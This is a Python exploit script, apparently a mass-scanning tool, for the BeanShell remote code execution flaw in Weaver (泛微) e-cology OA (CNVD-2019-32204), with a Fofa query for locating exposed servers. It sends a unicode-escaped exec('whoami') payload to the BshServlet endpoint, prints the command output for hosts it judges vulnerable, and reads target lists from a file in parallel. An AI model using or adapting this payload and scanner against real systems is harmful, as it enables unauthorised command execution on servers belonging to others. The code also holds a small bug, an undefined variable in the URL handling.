# -*- coding: utf-8 -*-
# 泛微OA Bsh 远程代码执行漏洞 CNVD-2019-32204
# Fofa:  app="泛微-协同办公OA"

import requests
import sys
import time
import argparse
import requests
import multiprocessing
from rich.console import Console
from bs4 import BeautifulSoup 

BLUE = '\033[0;36m'
RED = '\x1b[1;91m'
YELLOW = '\033[33m'
VIOLET = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}


def check(target):
    if target[:4] != 'http':
        target = 'http://' + target_url
    if target[-1] != '/':
        target += '/'
    target += "weaver/bsh.servlet.BshServlet"
    payload = """bsh.script=\\u0065\\u0078\\u0065\\u0063("whoami");&bsh.servlet.output=raw"""
    console.print(now_time() + " [INFO]     正在检测Beanshell RCE漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        request = requests.post(headers=headers, url=target, data=payload, timeout=5, verify=False)
        if ";</script>" not in request.text:
            if "Login.jsp" not in request.text:
                if "Error" not in request.text:
                    if "<head>" not in request.text:
                        console.print(now_time() + " [SUCCESS]     存在Beanshell RCE漏洞: {}".format(target), style='bold green')
                        console.print(now_time() + " [INFO]     可Post手动传值测试: {}".format(payload), style='bold blue')
                        console.print(now_time() + " [SUCCESS]     whoami: {}".format(request.text.strip('\n')), style='bold green')
                        return 'ok'
                    else:
                        console.print(now_time() + " [WARNING]     不存在Beanshell RCE漏洞", style='bold red')
                else:
                    console.print(now_time() + " [WARNING]  不存在Beanshell RCE漏洞", style='bold red')
            else:
                console.print(now_time() + " [WARNING]    不存在Beanshell RCE漏洞", style='bold red')
        else:
            console.print(now_time() + " [WARNING]     不存在Beanshell RCE漏洞", style='bold red')
    except:

        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(check, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            check(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
